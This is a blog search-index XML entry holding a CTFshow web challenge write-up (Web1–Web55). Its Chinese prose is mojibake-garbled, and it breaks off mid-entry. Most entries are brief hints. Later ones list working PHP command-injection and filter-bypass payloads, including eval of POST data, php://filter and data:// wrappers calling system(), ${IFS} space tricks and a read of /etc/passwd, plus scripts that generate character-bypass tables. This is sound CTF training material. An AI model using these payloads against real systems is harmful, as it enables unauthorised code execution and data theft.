<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshowåˆ·é¢˜è®°å½•</title>
    <url>/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>ä¸€äº›å…³äºåšctfshowå†™ä¸‹æ¥çš„wp</p>
<span id="more"></span>

<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤</span><br></pre></td></tr></table></figure>

<p>ç‰¹åˆ«ç®€å•çš„ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒF12å°±æœ‰flagäº†ã€‚</p>
<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</span><br></pre></td></tr></table></figure>

<p>ä»åˆ«çš„åœ°æ–¹è¿›åˆ°F12å°±è¡Œäº†</p>
<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…å°±è¡Œ</p>
<h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</span><br></pre></td></tr></table></figure>

<h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</span><br></pre></td></tr></table></figure>

<p><a href="http://www.zip/">www.zip</a></p>
<h1 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</span><br></pre></td></tr></table></figure>

<p>.gitæ³„éœ²</p>
<h1 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</span><br></pre></td></tr></table></figure>

<p>.svnæ³„éœ²</p>
<h1 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</span><br></pre></td></tr></table></figure>

<p>index.php.swp</p>
<h1 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</span><br></pre></td></tr></table></figure>

<h1 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h1><p>åŸŸåtxtè®°å½•</p>
<h1 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„è´¦å·å¯†ç </p>
<h1 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </span><br></pre></td></tr></table></figure>

<p>éšè—çš„å¯ç‚¹å‡»</p>
<h1 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°æ–‡ä»¶ä½ç½®</p>
<h1 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</span><br></pre></td></tr></table></figure>

<p>ç¤¾å·¥æ‰¾qqæ‰€åœ¨åœ°</p>
<h1 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</span><br></pre></td></tr></table></figure>

<p>phpæ¢é’ˆï¼Œç”¨äºè‡ªå·±æ­å»ºæœåŠ¡å™¨æ—¶å€™çš„æ¢æµ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è€ƒå¯ŸPHPæ¢é’ˆphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ /tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆï¼Œç„¶åæŸ¥çœ‹phpinfoæœç´¢flag</span><br></pre></td></tr></table></figure>

<h1 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰¾æ•°æ®åº“æ–‡ä»¶å³å¯</p>
<h1 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</span><br></pre></td></tr></table></figure>

<p>JSæ–‡ä»¶æºä»£ç æŸ¥çœ‹</p>
<h1 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥F12çœ‹æºç </p>
<h1 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰¾æ•°æ®åº“æ–‡ä»¶</p>
<h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</span><br></pre></td></tr></table></figure>

<p>å°±æ­£å¸¸çš„çˆ†ç ´ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ª</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-01-24/d6decdac4d2f159a3afe68e3d12ab18b--fcc0--image-20240124141403573.png" alt="image-20240124141403573"></p>
<h1 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå</span><br></pre></td></tr></table></figure>

<p> å­åŸŸåçˆ†ç ´å³å¯</p>
<h1 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„phpä¸­çš„md5çˆ†ç ´</p>
<h1 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†ä¸ªğŸ”¨</span><br></pre></td></tr></table></figure>

<p>éšæœºæ•°çˆ†ç ´ï¼Œç§å­éƒ½ç»™äº†ï¼Œç›´æ¥è‡ªå·±æœ¬åœ°è¿è¡Œä¸€ä¸‹å³å¯</p>
<h1 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†</span><br></pre></td></tr></table></figure>

<p>åéš¾ï¼Œä½¿ç”¨php_mt_seedå»ç ´è§£å¾—åˆ°seedä»è€Œå¾—åˆ°flagæœ€åã€‚</p>
<h1 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªå¯ä»¥çˆ†</span><br></pre></td></tr></table></figure>

<p>æš´åŠ›ç ´è§£ï¼Œä¸è¿‡å…¨ç©ºè¿™é¢˜ä¹Ÿèƒ½æœ‰flag</p>
<h1 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥èº«ä»½è¯æ—¥æœŸçˆ†ç ´</p>
<h1 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤§æµ·æé’ˆ</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çˆ†ç ´å³å¯</p>
<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥*ï¼Œæˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure>

<h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸Šé¢çš„echoè¿˜æ˜¯å¯ä»¥çš„æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_POST[0]);</span><br></pre></td></tr></table></figure>

<h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><p>è¿˜æ˜¯å¯ä»¥ä½¿ç”¨postæˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo`tac%09fl*`;</span><br></pre></td></tr></table></figure>

<h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;echo 1;&quot;); </span><br><span class="line">eval(&quot;echo 1?&gt;&quot;);</span><br><span class="line">åˆ†å·å¯ä»¥ç”±?&gt;ä»£æ›¿</span><br></pre></td></tr></table></figure>

<h1 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h1><p>æŠŠä¸Šé¢˜çš„urlå‚æ•°æ¢æˆä¸€ä¸ªæ•°å­—å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$nice=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h1><p>åŒä¸Šå³å¯</p>
<h1 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h1><p>åŒä¸Šå³å¯</p>
<h1 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h1><p>åŒä¸Šå³å¯ï¼Œ0æ”¹æˆaå°±è¡Œ</p>
<h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><p>base64ç¼–ç å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<p>å·²ç»å°†phpè¯­å¥é—­åˆäº†ï¼Œåé¢åŠ .phpæ²¡æœ‰ä»»ä½•ç”¨</p>
<h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line">pos()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line">array_reverse()ï¼šæ•°ç»„é€†åº </span><br><span class="line">scandir()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">next()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ é¦–å…ˆé€šè¿‡</span><br><span class="line">pos(localeconv())å¾—åˆ°ç‚¹å·ï¼Œå› ä¸ºscandir(â€™.â€™)è¡¨ç¤ºå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥scandir(pos(localeconv()))å°±èƒ½å¾—åˆ°flag.phpäº†ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±è·å¾—åˆ°äº†flagï¼Œæ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</p>
<h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p>è¿™é¢˜å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾åˆ°èƒ½å¤Ÿé€šè¿‡æˆ–æ“ä½œè·å¾—ç›¸åº”çš„å­—ç¬¦</p>
<p>phpç‰ˆï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>pyç‰ˆï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(i),re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(j),re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span>+ a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰‹åŠ¨æˆ–è€…pythonè‡ªåŠ¨å»æ‹¼æ¥éƒ½è¡Œ</p>
<h1 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h1><p>æ— å›æ˜¾</p>
<p>ç›´æ¥ç®¡é“ç¬¦æˆ–è€…æ¢è¡Œç»•è¿‡</p>
<p>è¦è®©å‘½ä»¤å›æ˜¾ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤åˆ†éš”ï¼Œä»¥æ­¤æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;     åˆ†å·</span><br><span class="line">|     åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span><br><span class="line">||    åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span><br><span class="line">&amp;     ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line">&amp;&amp;    ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line">%0a  æ¢è¡Œ</span><br></pre></td></tr></table></figure>

<p>åœ¨å‘½ä»¤åé¢åŠ ä¸Šå³å¯</p>
<h1 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h1><p>å¾ˆç®€å•ï¼Œè¿‡æ»¤äº†catç”¨tacå°±è¡Œnlä¹Ÿè¡Œ</p>
<h1 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h1><p>è¿‡æ»¤äº†flagï¼Œå¾ˆç®€å•çš„*ç»•è¿‡å°±è¡Œäº†</p>
<h1 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h1><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨${IFS}å°±è¡Œ</p>
<p>linuxé€‚ç”¨ç©ºæ ¼ç»•è¿‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;ã€&lt;&gt;ã€%20ï¼ˆspaceï¼‰ã€%09ï¼ˆtabï¼‰ã€$IFS<span class="variable">$9</span>ã€<span class="variable">$&#123;IFS&#125;</span>ã€<span class="variable">$IFS</span>ã€&#123;<span class="built_in">cat</span>,/etc/passwd&#125;ã€%0aï¼ˆå›è½¦ï¼‰</span><br></pre></td></tr></table></figure>

<h1 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h1><p>è¿‡æ»¤äº†*</p>
<p>æ³•ä¸€ï¼Œç¬¦å·ç»•è¿‡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl<span class="string">&#x27;&#x27;</span>ag.php||</span><br></pre></td></tr></table></figure>

<p>æ³•äºŒï¼Œé€šé…ç¬¦ â€œ ? â€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl?g.php||</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>

<h1 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h1><p>è¿‡æ»¤äº†ä¸€å †æ²¡ç”¨çš„ï¼Œå’Œä¸Šé¢˜ä¸€æ ·å†™å°±è¡Œ</p>
<h1 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h1><p>è¿˜æ˜¯è¿‡æ»¤äº†ä¸€å †æ²¡ç”¨çš„</p>
<h1 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h1><p>è¿˜æ˜¯å’Œä¹‹å‰çš„ä¸€æ ·</p>
<h1 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h1><p>è¿‡æ»¤äº†%09æ¢åˆ«çš„å°±è¡Œï¼Œè¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h1><p>è¿‡æ»¤äº†å¤§äºå°äºè¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œç”¨${IFS}å°±è¡Œ</p>
<p>è¿˜æœ‰å°±æ˜¯æ³¨æ„çš„æ˜¯flagæ²¡æœ‰phpåç¼€äº†</p>
<h1 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥äº†</p>
<h1 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h1><p>æ²¡æœ‰è¿‡æ»¤ï¼Ÿï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=vi$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<h1 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h1><p>åˆæ˜¯ä¸€ä¸ªæ¯”è¾ƒç¦»è°±çš„é¢˜ç›®</p>
<p>æœ‰ä¸‰ç§æ–¹æ³•å»å†™</p>
<p>ç¬¬ä¸€ç§å°±æ˜¯ç”¨base64å»è¯»æºæ–‡ä»¶</p>
